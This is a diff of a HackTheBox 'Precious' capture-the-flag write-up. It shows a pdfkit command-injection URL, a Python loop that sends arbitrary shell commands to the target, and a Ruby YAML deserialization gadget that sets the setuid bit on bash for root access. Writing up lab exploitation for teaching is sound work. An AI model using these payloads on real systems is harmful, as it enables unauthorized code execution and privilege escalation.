@@ -1,3 +1,11 @@
+1. [Writeup: **Precious**](#writeup-precious) 1. [EASY machine (hackthebox.com)](#easy-machine-hacktheboxcom) 2. [by **Sylvain _"JavaliMZ"_ Júlio** - 30/12/2022](#by-sylvain-javalimz-júlio---30122022)
+2. [Introduction](#introduction)
+3. [Enumeration](#enumeration)
+4. [Exploit - Remote Code Execution](#exploit---remote-code-execution)
+5. [Foothold](#foothold)
+6. [Privilege Escalation](#privilege-escalation)
+7. [Conclusion](#conclusion)
+
 ![](Assets/HTB-Linux-Easy-Precious/Precious.png)
 
 <img src="https://img.shields.io/badge/Precious-HackTheBox-green?style=plastic" width="200">
@@ -28,12 +36,12 @@ First, we need to confirm that we can reach the IP:
 
 ```bash
 ping -c 1 10.10.11.189
-    # PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
-    # 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
+	# PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
+	# 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
 
-    # --- 10.10.11.189 ping statistics ---
-    # 1 packets transmitted, 1 received, 0% packet loss, time 0ms
-    # rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
+	# --- 10.10.11.189 ping statistics ---
+	# 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+	# rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
 ```
 
 We send an ICMP packet, and the target machine sends it back. With the **ping** command (like ping pong), we know the machine is alive and we can start scanning the ports. We noticed one more thing with the ping command. The result gives us the TTL (Time to Live) which refers to the number of hops that a packet is allowed to make before it is discarded. When a packet travels through the Internet, every time it passes through a router, the router decrements this value by 1. For Windows, TTL starts at 128, and for Linux, TTL starts at 64. We can use this information to approximate the Operating System of the target machine. In this case, it is likely a Linux machine. It is important for future commands on the target machine.
@@ -75,6 +83,7 @@ We can see that the website download a PDF file. Visually, it is just a simples 
 We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we can get a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it's simple! We just need to add to the URL a parameter called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a bash code (because it is a Linux Machine) with the special symbol **`** (a code between 2 of this symbol in bash get execute before the rest of the command outside the symbols) around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine to test if we really got remote code execution. The final URL will be:
 
 > http://10.10.14.144/?name=%20`ping -c 1 10.10.14.144`
+
 ```bash
 # Set up a listener to capture the ping
 sudo tcpdump -i tun0 icmp
@@ -86,11 +95,11 @@ We got a ping back! I also create a tiny script in Python to have a fast way to 
 import requests
 
 while True:
-    cmd = input("[fAkeSh3ll ~] > ")
-    data = {
-        'url': f"http://10.10.14.144/?name=%20`{cmd}`",
-        }
-    response = requests.post('**http://precious.htb/**', data=data, verify=False)
+	cmd = input("[fAkeSh3ll ~] > ")
+	data = {
+		'url': f"http://10.10.14.144/?name=%20`{cmd}`",
+		}
+	response = requests.post('**http://precious.htb/**', data=data, verify=False)
 ```
 
 Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell on the target machine. But the way we got this is tricky. We need to find a way for the target machine to send its own shell to our machine. It's like trying to enter a house, and we need to find a way for the house to open its own door to give us access... The command that worked on the machine was this:
@@ -130,7 +139,7 @@ We got a little more privileges. But it is not enough!! WE NEED MORE AGAIN!!!!
 
 ![Sudo permissions](Assets/HTB-Linux-Easy-Precious/sudoPermission.png)
 
-The sudo command is a command to execute another command as root privileges. And **sudo -l** inform us that the user **henry** can execute ***/usr/bin/ruby /opt/update_dependencies.rb*** as root. When we examine the update_dependencies.rb file, we realize that the script use "YAML.load" to load that file. That means the file will be deserialized. deserialization is like converting the syntax of the content of the file into object in ruby (in this case). But like in a lot of languages, deserialization can be dangerous... And in this case, we can create our own YAML file to execute a command as root. We can find a good article [here](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization) but for python, and [here](https://www.elttam.com/blog/ruby-deserialization/#content) in ruby. But the code we will use is [here](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565).
+The sudo command is a command to execute another command as root privileges. And **sudo -l** inform us that the user **henry** can execute **_/usr/bin/ruby /opt/update_dependencies.rb_** as root. When we examine the update_dependencies.rb file, we realize that the script use "YAML.load" to load that file. That means the file will be deserialized. deserialization is like converting the syntax of the content of the file into object in ruby (in this case). But like in a lot of languages, deserialization can be dangerous... And in this case, we can create our own YAML file to execute a command as root. We can find a good article [here](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization) but for python, and [here](https://www.elttam.com/blog/ruby-deserialization/#content) in ruby. But the code we will use is [here](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565).
 
 ![Code execution as root](Assets/HTB-Linux-Easy-Precious/CEwithRootPriv.png)
 
@@ -139,23 +148,23 @@ We just create a file caller **test.txt** for confirm that the code is working. 
 ```bash
 ---
 - !ruby/object:Gem::Installer
-    i: x
+	i: x
 - !ruby/object:Gem::SpecFetcher
-    i: y
+	i: y
 - !ruby/object:Gem::Requirement
   requirements:
-    !ruby/object:Gem::Package::TarReader
-    io: &1 !ruby/object:Net::BufferedIO
-      io: &1 !ruby/object:Gem::Package::TarReader::Entry
-         read: 0
-         header: "abc"
-      debug_output: &1 !ruby/object:Net::WriteAdapter
-         socket: &1 !ruby/object:Gem::RequestSet
-             sets: !ruby/object:Net::WriteAdapter
-                 socket: !ruby/module 'Kernel'
-                 method_id: :system
-             git_set: chmod +s /usr/bin/bash
-         method_id: :resolve 
+	!ruby/object:Gem::Package::TarReader
+	io: &1 !ruby/object:Net::BufferedIO
+	  io: &1 !ruby/object:Gem::Package::TarReader::Entry
+		 read: 0
+		 header: "abc"
+	  debug_output: &1 !ruby/object:Net::WriteAdapter
+		 socket: &1 !ruby/object:Gem::RequestSet
+			 sets: !ruby/object:Net::WriteAdapter
+				 socket: !ruby/module 'Kernel'
+				 method_id: :system
+			 git_set: chmod +s /usr/bin/bash
+		 method_id: :resolve
 ```
 
 Now, we just need to execute the sudo command, and the **bash** program will be altered. And we can execute bash as root with a special flag:
